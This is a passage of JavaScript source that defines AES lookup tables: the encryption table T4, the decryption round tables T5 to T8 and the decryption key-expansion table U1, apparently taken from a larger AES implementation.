    var T4 = [0x6363a5c6, 0x7c7c84f8, 0x777799ee, 0x7b7b8df6, 0xf2f20dff, 0x6b6bbdd6, 0x6f6fb1de, 0xc5c55491, 0x30305060, 0x01010302, 0x6767a9ce, 0x2b2b7d56, 0xfefe19e7, 0xd7d762b5, 0xababe64d, 0x76769aec, 0xcaca458f, 0x82829d1f, 0xc9c94089, 0x7d7d87fa, 0xfafa15ef, 0x5959ebb2, 0x4747c98e, 0xf0f00bfb, 0xadadec41, 0xd4d467b3, 0xa2a2fd5f, 0xafafea45, 0x9c9cbf23, 0xa4a4f753, 0x727296e4, 0xc0c05b9b, 0xb7b7c275, 0xfdfd1ce1, 0x9393ae3d, 0x26266a4c, 0x36365a6c, 0x3f3f417e, 0xf7f702f5, 0xcccc4f83, 0x34345c68, 0xa5a5f451, 0xe5e534d1, 0xf1f108f9, 0x717193e2, 0xd8d873ab, 0x31315362, 0x15153f2a, 0x04040c08, 0xc7c75295, 0x23236546, 0xc3c35e9d, 0x18182830, 0x9696a137, 0x05050f0a, 0x9a9ab52f, 0x0707090e, 0x12123624, 0x80809b1b, 0xe2e23ddf, 0xebeb26cd, 0x2727694e, 0xb2b2cd7f, 0x75759fea, 0x09091b12, 0x83839e1d, 0x2c2c7458, 0x1a1a2e34, 0x1b1b2d36, 0x6e6eb2dc, 0x5a5aeeb4, 0xa0a0fb5b, 0x5252f6a4, 0x3b3b4d76, 0xd6d661b7, 0xb3b3ce7d, 0x29297b52, 0xe3e33edd, 0x2f2f715e, 0x84849713, 0x5353f5a6, 0xd1d168b9, 0x00000000, 0xeded2cc1, 0x20206040, 0xfcfc1fe3, 0xb1b1c879, 0x5b5bedb6, 0x6a6abed4, 0xcbcb468d, 0xbebed967, 0x39394b72, 0x4a4ade94, 0x4c4cd498, 0x5858e8b0, 0xcfcf4a85, 0xd0d06bbb, 0xefef2ac5, 0xaaaae54f, 0xfbfb16ed, 0x4343c586, 0x4d4dd79a, 0x33335566, 0x85859411, 0x4545cf8a, 0xf9f910e9, 0x02020604, 0x7f7f81fe, 0x5050f0a0, 0x3c3c4478, 0x9f9fba25, 0xa8a8e34b, 0x5151f3a2, 0xa3a3fe5d, 0x4040c080, 0x8f8f8a05, 0x9292ad3f, 0x9d9dbc21, 0x38384870, 0xf5f504f1, 0xbcbcdf63, 0xb6b6c177, 0xdada75af, 0x21216342, 0x10103020, 0xffff1ae5, 0xf3f30efd, 0xd2d26dbf, 0xcdcd4c81, 0x0c0c1418, 0x13133526, 0xecec2fc3, 0x5f5fe1be, 0x9797a235, 0x4444cc88, 0x1717392e, 0xc4c45793, 0xa7a7f255, 0x7e7e82fc, 0x3d3d477a, 0x6464acc8, 0x5d5de7ba, 0x19192b32, 0x737395e6, 0x6060a0c0, 0x81819819, 0x4f4fd19e, 0xdcdc7fa3, 0x22226644, 0x2a2a7e54, 0x9090ab3b, 0x8888830b, 0x4646ca8c, 0xeeee29c7, 0xb8b8d36b, 0x14143c28, 0xdede79a7, 0x5e5ee2bc, 0x0b0b1d16, 0xdbdb76ad, 0xe0e03bdb, 0x32325664, 0x3a3a4e74, 0x0a0a1e14, 0x4949db92, 0x06060a0c, 0x24246c48, 0x5c5ce4b8, 0xc2c25d9f, 0xd3d36ebd, 0xacacef43, 0x6262a6c4, 0x9191a839, 0x9595a431, 0xe4e437d3, 0x79798bf2, 0xe7e732d5, 0xc8c8438b, 0x3737596e, 0x6d6db7da, 0x8d8d8c01, 0xd5d564b1, 0x4e4ed29c, 0xa9a9e049, 0x6c6cb4d8, 0x5656faac, 0xf4f407f3, 0xeaea25cf, 0x6565afca, 0x7a7a8ef4, 0xaeaee947, 0x08081810, 0xbabad56f, 0x787888f0, 0x25256f4a, 0x2e2e725c, 0x1c1c2438, 0xa6a6f157, 0xb4b4c773, 0xc6c65197, 0xe8e823cb, 0xdddd7ca1, 0x74749ce8, 0x1f1f213e, 0x4b4bdd96, 0xbdbddc61, 0x8b8b860d, 0x8a8a850f, 0x707090e0, 0x3e3e427c, 0xb5b5c471, 0x6666aacc, 0x4848d890, 0x03030506, 0xf6f601f7, 0x0e0e121c, 0x6161a3c2, 0x35355f6a, 0x5757f9ae, 0xb9b9d069, 0x86869117, 0xc1c15899, 0x1d1d273a, 0x9e9eb927, 0xe1e138d9, 0xf8f813eb, 0x9898b32b, 0x11113322, 0x6969bbd2, 0xd9d970a9, 0x8e8e8907, 0x9494a733, 0x9b9bb62d, 0x1e1e223c, 0x87879215, 0xe9e920c9, 0xcece4987, 0x5555ffaa, 0x28287850, 0xdfdf7aa5, 0x8c8c8f03, 0xa1a1f859, 0x89898009, 0x0d0d171a, 0xbfbfda65, 0xe6e631d7, 0x4242c684, 0x6868b8d0, 0x4141c382, 0x9999b029, 0x2d2d775a, 0x0f0f111e, 0xb0b0cb7b, 0x5454fca8, 0xbbbbd66d, 0x16163a2c];

    // Transformations for decryption
    var T5 = [0x51f4a750, 0x7e416553, 0x1a17a4c3, 0x3a275e96, 0x3bab6bcb, 0x1f9d45f1, 0xacfa58ab, 0x4be30393, 0x2030fa55, 0xad766df6, 0x88cc7691, 0xf5024c25, 0x4fe5d7fc, 0xc52acbd7, 0x26354480, 0xb562a38f, 0xdeb15a49, 0x25ba1b67, 0x45ea0e98, 0x5dfec0e1, 0xc32f7502, 0x814cf012, 0x8d4697a3, 0x6bd3f9c6, 0x038f5fe7, 0x15929c95, 0xbf6d7aeb, 0x955259da, 0xd4be832d, 0x587421d3, 0x49e06929, 0x8ec9c844, 0x75c2896a, 0xf48e7978, 0x99583e6b, 0x27b971dd, 0xbee14fb6, 0xf088ad17, 0xc920ac66, 0x7dce3ab4, 0x63df4a18, 0xe51a3182, 0x97513360, 0x62537f45, 0xb16477e0, 0xbb6bae84, 0xfe81a01c, 0xf9082b94, 0x70486858, 0x8f45fd19, 0x94de6c87, 0x527bf8b7, 0xab73d323, 0x724b02e2, 0xe31f8f57, 0x6655ab2a, 0xb2eb2807, 0x2fb5c203, 0x86c57b9a, 0xd33708a5, 0x302887f2, 0x23bfa5b2, 0x02036aba, 0xed16825c, 0x8acf1c2b, 0xa779b492, 0xf307f2f0, 0x4e69e2a1, 0x65daf4cd, 0x0605bed5, 0xd134621f, 0xc4a6fe8a, 0x342e539d, 0xa2f355a0, 0x058ae132, 0xa4f6eb75, 0x0b83ec39, 0x4060efaa, 0x5e719f06, 0xbd6e1051, 0x3e218af9, 0x96dd063d, 0xdd3e05ae, 0x4de6bd46, 0x91548db5, 0x71c45d05, 0x0406d46f, 0x605015ff, 0x1998fb24, 0xd6bde997, 0x894043cc, 0x67d99e77, 0xb0e842bd, 0x07898b88, 0xe7195b38, 0x79c8eedb, 0xa17c0a47, 0x7c420fe9, 0xf8841ec9, 0x00000000, 0x09808683, 0x322bed48, 0x1e1170ac, 0x6c5a724e, 0xfd0efffb, 0x0f853856, 0x3daed51e, 0x362d3927, 0x0a0fd964, 0x685ca621, 0x9b5b54d1, 0x24362e3a, 0x0c0a67b1, 0x9357e70f, 0xb4ee96d2, 0x1b9b919e, 0x80c0c54f, 0x61dc20a2, 0x5a774b69, 0x1c121a16, 0xe293ba0a, 0xc0a02ae5, 0x3c22e043, 0x121b171d, 0x0e090d0b, 0xf28bc7ad, 0x2db6a8b9, 0x141ea9c8, 0x57f11985, 0xaf75074c, 0xee99ddbb, 0xa37f60fd, 0xf701269f, 0x5c72f5bc, 0x44663bc5, 0x5bfb7e34, 0x8b432976, 0xcb23c6dc, 0xb6edfc68, 0xb8e4f163, 0xd731dcca, 0x42638510, 0x13972240, 0x84c61120, 0x854a247d, 0xd2bb3df8, 0xaef93211, 0xc729a16d, 0x1d9e2f4b, 0xdcb230f3, 0x0d8652ec, 0x77c1e3d0, 0x2bb3166c, 0xa970b999, 0x119448fa, 0x47e96422, 0xa8fc8cc4, 0xa0f03f1a, 0x567d2cd8, 0x223390ef, 0x87494ec7, 0xd938d1c1, 0x8ccaa2fe, 0x98d40b36, 0xa6f581cf, 0xa57ade28, 0xdab78e26, 0x3fadbfa4, 0x2c3a9de4, 0x5078920d, 0x6a5fcc9b, 0x547e4662, 0xf68d13c2, 0x90d8b8e8, 0x2e39f75e, 0x82c3aff5, 0x9f5d80be, 0x69d0937c, 0x6fd52da9, 0xcf2512b3, 0xc8ac993b, 0x10187da7, 0xe89c636e, 0xdb3bbb7b, 0xcd267809, 0x6e5918f4, 0xec9ab701, 0x834f9aa8, 0xe6956e65, 0xaaffe67e, 0x21bccf08, 0xef15e8e6, 0xbae79bd9, 0x4a6f36ce, 0xea9f09d4, 0x29b07cd6, 0x31a4b2af, 0x2a3f2331, 0xc6a59430, 0x35a266c0, 0x744ebc37, 0xfc82caa6, 0xe090d0b0, 0x33a7d815, 0xf104984a, 0x41ecdaf7, 0x7fcd500e, 0x1791f62f, 0x764dd68d, 0x43efb04d, 0xccaa4d54, 0xe49604df, 0x9ed1b5e3, 0x4c6a881b, 0xc12c1fb8, 0x4665517f, 0x9d5eea04, 0x018c355d, 0xfa877473, 0xfb0b412e, 0xb3671d5a, 0x92dbd252, 0xe9105633, 0x6dd64713, 0x9ad7618c, 0x37a10c7a, 0x59f8148e, 0xeb133c89, 0xcea927ee, 0xb761c935, 0xe11ce5ed, 0x7a47b13c, 0x9cd2df59, 0x55f2733f, 0x1814ce79, 0x73c737bf, 0x53f7cdea, 0x5ffdaa5b, 0xdf3d6f14, 0x7844db86, 0xcaaff381, 0xb968c43e, 0x3824342c, 0xc2a3405f, 0x161dc372, 0xbce2250c, 0x283c498b, 0xff0d9541, 0x39a80171, 0x080cb3de, 0xd8b4e49c, 0x6456c190, 0x7bcb8461, 0xd532b670, 0x486c5c74, 0xd0b85742];
    var T6 = [0x5051f4a7, 0x537e4165, 0xc31a17a4, 0x963a275e, 0xcb3bab6b, 0xf11f9d45, 0xabacfa58, 0x934be303, 0x552030fa, 0xf6ad766d, 0x9188cc76, 0x25f5024c, 0xfc4fe5d7, 0xd7c52acb, 0x80263544, 0x8fb562a3, 0x49deb15a, 0x6725ba1b, 0x9845ea0e, 0xe15dfec0, 0x02c32f75, 0x12814cf0, 0xa38d4697, 0xc66bd3f9, 0xe7038f5f, 0x9515929c, 0xebbf6d7a, 0xda955259, 0x2dd4be83, 0xd3587421, 0x2949e069, 0x448ec9c8, 0x6a75c289, 0x78f48e79, 0x6b99583e, 0xdd27b971, 0xb6bee14f, 0x17f088ad, 0x66c920ac, 0xb47dce3a, 0x1863df4a, 0x82e51a31, 0x60975133, 0x4562537f, 0xe0b16477, 0x84bb6bae, 0x1cfe81a0, 0x94f9082b, 0x58704868, 0x198f45fd, 0x8794de6c, 0xb7527bf8, 0x23ab73d3, 0xe2724b02, 0x57e31f8f, 0x2a6655ab, 0x07b2eb28, 0x032fb5c2, 0x9a86c57b, 0xa5d33708, 0xf2302887, 0xb223bfa5, 0xba02036a, 0x5ced1682, 0x2b8acf1c, 0x92a779b4, 0xf0f307f2, 0xa14e69e2, 0xcd65daf4, 0xd50605be, 0x1fd13462, 0x8ac4a6fe, 0x9d342e53, 0xa0a2f355, 0x32058ae1, 0x75a4f6eb, 0x390b83ec, 0xaa4060ef, 0x065e719f, 0x51bd6e10, 0xf93e218a, 0x3d96dd06, 0xaedd3e05, 0x464de6bd, 0xb591548d, 0x0571c45d, 0x6f0406d4, 0xff605015, 0x241998fb, 0x97d6bde9, 0xcc894043, 0x7767d99e, 0xbdb0e842, 0x8807898b, 0x38e7195b, 0xdb79c8ee, 0x47a17c0a, 0xe97c420f, 0xc9f8841e, 0x00000000, 0x83098086, 0x48322bed, 0xac1e1170, 0x4e6c5a72, 0xfbfd0eff, 0x560f8538, 0x1e3daed5, 0x27362d39, 0x640a0fd9, 0x21685ca6, 0xd19b5b54, 0x3a24362e, 0xb10c0a67, 0x0f9357e7, 0xd2b4ee96, 0x9e1b9b91, 0x4f80c0c5, 0xa261dc20, 0x695a774b, 0x161c121a, 0x0ae293ba, 0xe5c0a02a, 0x433c22e0, 0x1d121b17, 0x0b0e090d, 0xadf28bc7, 0xb92db6a8, 0xc8141ea9, 0x8557f119, 0x4caf7507, 0xbbee99dd, 0xfda37f60, 0x9ff70126, 0xbc5c72f5, 0xc544663b, 0x345bfb7e, 0x768b4329, 0xdccb23c6, 0x68b6edfc, 0x63b8e4f1, 0xcad731dc, 0x10426385, 0x40139722, 0x2084c611, 0x7d854a24, 0xf8d2bb3d, 0x11aef932, 0x6dc729a1, 0x4b1d9e2f, 0xf3dcb230, 0xec0d8652, 0xd077c1e3, 0x6c2bb316, 0x99a970b9, 0xfa119448, 0x2247e964, 0xc4a8fc8c, 0x1aa0f03f, 0xd8567d2c, 0xef223390, 0xc787494e, 0xc1d938d1, 0xfe8ccaa2, 0x3698d40b, 0xcfa6f581, 0x28a57ade, 0x26dab78e, 0xa43fadbf, 0xe42c3a9d, 0x0d507892, 0x9b6a5fcc, 0x62547e46, 0xc2f68d13, 0xe890d8b8, 0x5e2e39f7, 0xf582c3af, 0xbe9f5d80, 0x7c69d093, 0xa96fd52d, 0xb3cf2512, 0x3bc8ac99, 0xa710187d, 0x6ee89c63, 0x7bdb3bbb, 0x09cd2678, 0xf46e5918, 0x01ec9ab7, 0xa8834f9a, 0x65e6956e, 0x7eaaffe6, 0x0821bccf, 0xe6ef15e8, 0xd9bae79b, 0xce4a6f36, 0xd4ea9f09, 0xd629b07c, 0xaf31a4b2, 0x312a3f23, 0x30c6a594, 0xc035a266, 0x37744ebc, 0xa6fc82ca, 0xb0e090d0, 0x1533a7d8, 0x4af10498, 0xf741ecda, 0x0e7fcd50, 0x2f1791f6, 0x8d764dd6, 0x4d43efb0, 0x54ccaa4d, 0xdfe49604, 0xe39ed1b5, 0x1b4c6a88, 0xb8c12c1f, 0x7f466551, 0x049d5eea, 0x5d018c35, 0x73fa8774, 0x2efb0b41, 0x5ab3671d, 0x5292dbd2, 0x33e91056, 0x136dd647, 0x8c9ad761, 0x7a37a10c, 0x8e59f814, 0x89eb133c, 0xeecea927, 0x35b761c9, 0xede11ce5, 0x3c7a47b1, 0x599cd2df, 0x3f55f273, 0x791814ce, 0xbf73c737, 0xea53f7cd, 0x5b5ffdaa, 0x14df3d6f, 0x867844db, 0x81caaff3, 0x3eb968c4, 0x2c382434, 0x5fc2a340, 0x72161dc3, 0x0cbce225, 0x8b283c49, 0x41ff0d95, 0x7139a801, 0xde080cb3, 0x9cd8b4e4, 0x906456c1, 0x617bcb84, 0x70d532b6, 0x74486c5c, 0x42d0b857];
    var T7 = [0xa75051f4, 0x65537e41, 0xa4c31a17, 0x5e963a27, 0x6bcb3bab, 0x45f11f9d, 0x58abacfa, 0x03934be3, 0xfa552030, 0x6df6ad76, 0x769188cc, 0x4c25f502, 0xd7fc4fe5, 0xcbd7c52a, 0x44802635, 0xa38fb562, 0x5a49deb1, 0x1b6725ba, 0x0e9845ea, 0xc0e15dfe, 0x7502c32f, 0xf012814c, 0x97a38d46, 0xf9c66bd3, 0x5fe7038f, 0x9c951592, 0x7aebbf6d, 0x59da9552, 0x832dd4be, 0x21d35874, 0x692949e0, 0xc8448ec9, 0x896a75c2, 0x7978f48e, 0x3e6b9958, 0x71dd27b9, 0x4fb6bee1, 0xad17f088, 0xac66c920, 0x3ab47dce, 0x4a1863df, 0x3182e51a, 0x33609751, 0x7f456253, 0x77e0b164, 0xae84bb6b, 0xa01cfe81, 0x2b94f908, 0x68587048, 0xfd198f45, 0x6c8794de, 0xf8b7527b, 0xd323ab73, 0x02e2724b, 0x8f57e31f, 0xab2a6655, 0x2807b2eb, 0xc2032fb5, 0x7b9a86c5, 0x08a5d337, 0x87f23028, 0xa5b223bf, 0x6aba0203, 0x825ced16, 0x1c2b8acf, 0xb492a779, 0xf2f0f307, 0xe2a14e69, 0xf4cd65da, 0xbed50605, 0x621fd134, 0xfe8ac4a6, 0x539d342e, 0x55a0a2f3, 0xe132058a, 0xeb75a4f6, 0xec390b83, 0xefaa4060, 0x9f065e71, 0x1051bd6e, 0x8af93e21, 0x063d96dd, 0x05aedd3e, 0xbd464de6, 0x8db59154, 0x5d0571c4, 0xd46f0406, 0x15ff6050, 0xfb241998, 0xe997d6bd, 0x43cc8940, 0x9e7767d9, 0x42bdb0e8, 0x8b880789, 0x5b38e719, 0xeedb79c8, 0x0a47a17c, 0x0fe97c42, 0x1ec9f884, 0x00000000, 0x86830980, 0xed48322b, 0x70ac1e11, 0x724e6c5a, 0xfffbfd0e, 0x38560f85, 0xd51e3dae, 0x3927362d, 0xd9640a0f, 0xa621685c, 0x54d19b5b, 0x2e3a2436, 0x67b10c0a, 0xe70f9357, 0x96d2b4ee, 0x919e1b9b, 0xc54f80c0, 0x20a261dc, 0x4b695a77, 0x1a161c12, 0xba0ae293, 0x2ae5c0a0, 0xe0433c22, 0x171d121b, 0x0d0b0e09, 0xc7adf28b, 0xa8b92db6, 0xa9c8141e, 0x198557f1, 0x074caf75, 0xddbbee99, 0x60fda37f, 0x269ff701, 0xf5bc5c72, 0x3bc54466, 0x7e345bfb, 0x29768b43, 0xc6dccb23, 0xfc68b6ed, 0xf163b8e4, 0xdccad731, 0x85104263, 0x22401397, 0x112084c6, 0x247d854a, 0x3df8d2bb, 0x3211aef9, 0xa16dc729, 0x2f4b1d9e, 0x30f3dcb2, 0x52ec0d86, 0xe3d077c1, 0x166c2bb3, 0xb999a970, 0x48fa1194, 0x642247e9, 0x8cc4a8fc, 0x3f1aa0f0, 0x2cd8567d, 0x90ef2233, 0x4ec78749, 0xd1c1d938, 0xa2fe8cca, 0x0b3698d4, 0x81cfa6f5, 0xde28a57a, 0x8e26dab7, 0xbfa43fad, 0x9de42c3a, 0x920d5078, 0xcc9b6a5f, 0x4662547e, 0x13c2f68d, 0xb8e890d8, 0xf75e2e39, 0xaff582c3, 0x80be9f5d, 0x937c69d0, 0x2da96fd5, 0x12b3cf25, 0x993bc8ac, 0x7da71018, 0x636ee89c, 0xbb7bdb3b, 0x7809cd26, 0x18f46e59, 0xb701ec9a, 0x9aa8834f, 0x6e65e695, 0xe67eaaff, 0xcf0821bc, 0xe8e6ef15, 0x9bd9bae7, 0x36ce4a6f, 0x09d4ea9f, 0x7cd629b0, 0xb2af31a4, 0x23312a3f, 0x9430c6a5, 0x66c035a2, 0xbc37744e, 0xcaa6fc82, 0xd0b0e090, 0xd81533a7, 0x984af104, 0xdaf741ec, 0x500e7fcd, 0xf62f1791, 0xd68d764d, 0xb04d43ef, 0x4d54ccaa, 0x04dfe496, 0xb5e39ed1, 0x881b4c6a, 0x1fb8c12c, 0x517f4665, 0xea049d5e, 0x355d018c, 0x7473fa87, 0x412efb0b, 0x1d5ab367, 0xd25292db, 0x5633e910, 0x47136dd6, 0x618c9ad7, 0x0c7a37a1, 0x148e59f8, 0x3c89eb13, 0x27eecea9, 0xc935b761, 0xe5ede11c, 0xb13c7a47, 0xdf599cd2, 0x733f55f2, 0xce791814, 0x37bf73c7, 0xcdea53f7, 0xaa5b5ffd, 0x6f14df3d, 0xdb867844, 0xf381caaf, 0xc43eb968, 0x342c3824, 0x405fc2a3, 0xc372161d, 0x250cbce2, 0x498b283c, 0x9541ff0d, 0x017139a8, 0xb3de080c, 0xe49cd8b4, 0xc1906456, 0x84617bcb, 0xb670d532, 0x5c74486c, 0x5742d0b8];
    var T8 = [0xf4a75051, 0x4165537e, 0x17a4c31a, 0x275e963a, 0xab6bcb3b, 0x9d45f11f, 0xfa58abac, 0xe303934b, 0x30fa5520, 0x766df6ad, 0xcc769188, 0x024c25f5, 0xe5d7fc4f, 0x2acbd7c5, 0x35448026, 0x62a38fb5, 0xb15a49de, 0xba1b6725, 0xea0e9845, 0xfec0e15d, 0x2f7502c3, 0x4cf01281, 0x4697a38d, 0xd3f9c66b, 0x8f5fe703, 0x929c9515, 0x6d7aebbf, 0x5259da95, 0xbe832dd4, 0x7421d358, 0xe0692949, 0xc9c8448e, 0xc2896a75, 0x8e7978f4, 0x583e6b99, 0xb971dd27, 0xe14fb6be, 0x88ad17f0, 0x20ac66c9, 0xce3ab47d, 0xdf4a1863, 0x1a3182e5, 0x51336097, 0x537f4562, 0x6477e0b1, 0x6bae84bb, 0x81a01cfe, 0x082b94f9, 0x48685870, 0x45fd198f, 0xde6c8794, 0x7bf8b752, 0x73d323ab, 0x4b02e272, 0x1f8f57e3, 0x55ab2a66, 0xeb2807b2, 0xb5c2032f, 0xc57b9a86, 0x3708a5d3, 0x2887f230, 0xbfa5b223, 0x036aba02, 0x16825ced, 0xcf1c2b8a, 0x79b492a7, 0x07f2f0f3, 0x69e2a14e, 0xdaf4cd65, 0x05bed506, 0x34621fd1, 0xa6fe8ac4, 0x2e539d34, 0xf355a0a2, 0x8ae13205, 0xf6eb75a4, 0x83ec390b, 0x60efaa40, 0x719f065e, 0x6e1051bd, 0x218af93e, 0xdd063d96, 0x3e05aedd, 0xe6bd464d, 0x548db591, 0xc45d0571, 0x06d46f04, 0x5015ff60, 0x98fb2419, 0xbde997d6, 0x4043cc89, 0xd99e7767, 0xe842bdb0, 0x898b8807, 0x195b38e7, 0xc8eedb79, 0x7c0a47a1, 0x420fe97c, 0x841ec9f8, 0x00000000, 0x80868309, 0x2bed4832, 0x1170ac1e, 0x5a724e6c, 0x0efffbfd, 0x8538560f, 0xaed51e3d, 0x2d392736, 0x0fd9640a, 0x5ca62168, 0x5b54d19b, 0x362e3a24, 0x0a67b10c, 0x57e70f93, 0xee96d2b4, 0x9b919e1b, 0xc0c54f80, 0xdc20a261, 0x774b695a, 0x121a161c, 0x93ba0ae2, 0xa02ae5c0, 0x22e0433c, 0x1b171d12, 0x090d0b0e, 0x8bc7adf2, 0xb6a8b92d, 0x1ea9c814, 0xf1198557, 0x75074caf, 0x99ddbbee, 0x7f60fda3, 0x01269ff7, 0x72f5bc5c, 0x663bc544, 0xfb7e345b, 0x4329768b, 0x23c6dccb, 0xedfc68b6, 0xe4f163b8, 0x31dccad7, 0x63851042, 0x97224013, 0xc6112084, 0x4a247d85, 0xbb3df8d2, 0xf93211ae, 0x29a16dc7, 0x9e2f4b1d, 0xb230f3dc, 0x8652ec0d, 0xc1e3d077, 0xb3166c2b, 0x70b999a9, 0x9448fa11, 0xe9642247, 0xfc8cc4a8, 0xf03f1aa0, 0x7d2cd856, 0x3390ef22, 0x494ec787, 0x38d1c1d9, 0xcaa2fe8c, 0xd40b3698, 0xf581cfa6, 0x7ade28a5, 0xb78e26da, 0xadbfa43f, 0x3a9de42c, 0x78920d50, 0x5fcc9b6a, 0x7e466254, 0x8d13c2f6, 0xd8b8e890, 0x39f75e2e, 0xc3aff582, 0x5d80be9f, 0xd0937c69, 0xd52da96f, 0x2512b3cf, 0xac993bc8, 0x187da710, 0x9c636ee8, 0x3bbb7bdb, 0x267809cd, 0x5918f46e, 0x9ab701ec, 0x4f9aa883, 0x956e65e6, 0xffe67eaa, 0xbccf0821, 0x15e8e6ef, 0xe79bd9ba, 0x6f36ce4a, 0x9f09d4ea, 0xb07cd629, 0xa4b2af31, 0x3f23312a, 0xa59430c6, 0xa266c035, 0x4ebc3774, 0x82caa6fc, 0x90d0b0e0, 0xa7d81533, 0x04984af1, 0xecdaf741, 0xcd500e7f, 0x91f62f17, 0x4dd68d76, 0xefb04d43, 0xaa4d54cc, 0x9604dfe4, 0xd1b5e39e, 0x6a881b4c, 0x2c1fb8c1, 0x65517f46, 0x5eea049d, 0x8c355d01, 0x877473fa, 0x0b412efb, 0x671d5ab3, 0xdbd25292, 0x105633e9, 0xd647136d, 0xd7618c9a, 0xa10c7a37, 0xf8148e59, 0x133c89eb, 0xa927eece, 0x61c935b7, 0x1ce5ede1, 0x47b13c7a, 0xd2df599c, 0xf2733f55, 0x14ce7918, 0xc737bf73, 0xf7cdea53, 0xfdaa5b5f, 0x3d6f14df, 0x44db8678, 0xaff381ca, 0x68c43eb9, 0x24342c38, 0xa3405fc2, 0x1dc37216, 0xe2250cbc, 0x3c498b28, 0x0d9541ff, 0xa8017139, 0x0cb3de08, 0xb4e49cd8, 0x56c19064, 0xcb84617b, 0x32b670d5, 0x6c5c7448, 0xb85742d0];

    // Transformations for decryption key expansion
    var U1 = [0x00000000, 0x0e090d0b, 0x1c121a16, 0x121b171d, 0x3824342c, 0x362d3927, 0x24362e3a, 0x2a3f2331, 0x70486858, 0x7e416553, 0x6c5a724e, 0x62537f45, 0x486c5c74, 0x4665517f, 0x547e4662, 0x5a774b69, 0xe090d0b0, 0xee99ddbb, 0xfc82caa6, 0xf28bc7ad, 0xd8b4e49c, 0xd6bde997, 0xc4a6fe8a, 0xcaaff381, 0x90d8b8e8, 0x9ed1b5e3, 0x8ccaa2fe, 0x82c3aff5, 0xa8fc8cc4, 0xa6f581cf, 0xb4ee96d2, 0xbae79bd9, 0xdb3bbb7b, 0xd532b670, 0xc729a16d, 0xc920ac66, 0xe31f8f57, 0xed16825c, 0xff0d9541, 0xf104984a, 0xab73d323, 0xa57ade28, 0xb761c935, 0xb968c43e, 0x9357e70f, 0x9d5eea04, 0x8f45fd19, 0x814cf012, 0x3bab6bcb, 0x35a266c0, 0x27b971dd, 0x29b07cd6, 0x038f5fe7, 0x0d8652ec, 0x1f9d45f1, 0x119448fa, 0x4be30393, 0x45ea0e98, 0x57f11985, 0x59f8148e, 0x73c737bf, 0x7dce3ab4, 0x6fd52da9, 0x61dc20a2, 0xad766df6, 0xa37f60fd, 0xb16477e0, 0xbf6d7aeb, 0x955259da, 0x9b5b54d1, 0x894043cc, 0x87494ec7, 0xdd3e05ae, 0xd33708a5, 0xc12c1fb8, 0xcf2512b3, 0xe51a3182, 0xeb133c89, 0xf9082b94, 0xf701269f, 0x4de6bd46, 0x43efb04d, 0x51f4a750, 0x5ffdaa5b, 0x75c2896a, 0x7bcb8461, 0x69d0937c, 0x67d99e77, 0x3daed51e, 0x33a7d815, 0x21bccf08, 0x2fb5c203, 0x058ae132, 0x0b83ec39, 0x1998fb24, 0x1791f62f, 0x764dd68d, 0x7844db86, 0x6a5fcc9b, 0x6456c190, 0x4e69e2a1, 0x4060efaa, 0x527bf8b7, 0x5c72f5bc, 0x0605bed5, 0x080cb3de, 0x1a17a4c3, 0x141ea9c8, 0x3e218af9, 0x302887f2, 0x223390ef, 0x2c3a9de4, 0x96dd063d, 0x98d40b36, 0x8acf1c2b, 0x84c61120, 0xaef93211, 0xa0f03f1a, 0xb2eb2807, 0xbce2250c, 0xe6956e65, 0xe89c636e, 0xfa877473, 0xf48e7978, 0xdeb15a49, 0xd0b85742, 0xc2a3405f, 0xccaa4d54, 0x41ecdaf7, 0x4fe5d7fc, 0x5dfec0e1, 0x53f7cdea, 0x79c8eedb, 0x77c1e3d0, 0x65daf4cd, 0x6bd3f9c6, 0x31a4b2af, 0x3fadbfa4, 0x2db6a8b9, 0x23bfa5b2, 0x09808683, 0x07898b88, 0x15929c95, 0x1b9b919e, 0xa17c0a47, 0xaf75074c, 0xbd6e1051, 0xb3671d5a, 0x99583e6b, 0x97513360, 0x854a247d, 0x8b432976, 0xd134621f, 0xdf3d6f14, 0xcd267809, 0xc32f7502, 0xe9105633, 0xe7195b38, 0xf5024c25, 0xfb0b412e, 0x9ad7618c, 0x94de6c87, 0x86c57b9a, 0x88cc7691, 0xa2f355a0, 0xacfa58ab, 0xbee14fb6, 0xb0e842bd, 0xea9f09d4, 0xe49604df, 0xf68d13c2, 0xf8841ec9, 0xd2bb3df8, 0xdcb230f3, 0xcea927ee, 0xc0a02ae5, 0x7a47b13c, 0x744ebc37, 0x6655ab2a, 0x685ca621, 0x42638510, 0x4c6a881b, 0x5e719f06, 0x5078920d, 0x0a0fd964, 0x0406d46f, 0x161dc372, 0x1814ce79, 0x322bed48, 0x3c22e043, 0x2e39f75e, 0x2030fa55, 0xec9ab701, 0xe293ba0a, 0xf088ad17, 0xfe81a01c, 0xd4be832d, 0xdab78e26, 0xc8ac993b, 0xc6a59430, 0x9cd2df59, 0x92dbd252, 0x80c0c54f, 0x8ec9c844, 0xa4f6eb75, 0xaaffe67e, 0xb8e4f163, 0xb6edfc68, 0x0c0a67b1, 0x02036aba, 0x10187da7, 0x1e1170ac, 0x342e539d, 0x3a275e96, 0x283c498b, 0x26354480, 0x7c420fe9, 0x724b02e2, 0x605015ff, 0x6e5918f4, 0x44663bc5, 0x4a6f36ce, 0x587421d3, 0x567d2cd8, 0x37a10c7a, 0x39a80171, 0x2bb3166c, 0x25ba1b67, 0x0f853856, 0x018c355d, 0x13972240, 0x1d9e2f4b, 0x47e96422, 0x49e06929, 0x5bfb7e34, 0x55f2733f, 0x7fcd500e, 0x71c45d05, 0x63df4a18, 0x6dd64713, 0xd731dcca, 0xd938d1c1, 0xcb23c6dc, 0xc52acbd7, 0xef15e8e6, 0xe11ce5ed, 0xf307f2f0, 0xfd0efffb, 0xa779b492, 0xa970b999, 0xbb6bae84, 0xb562a38f, 0x9f5d80be, 0x91548db5, 0x834f9aa8, 0x8d4697a3];
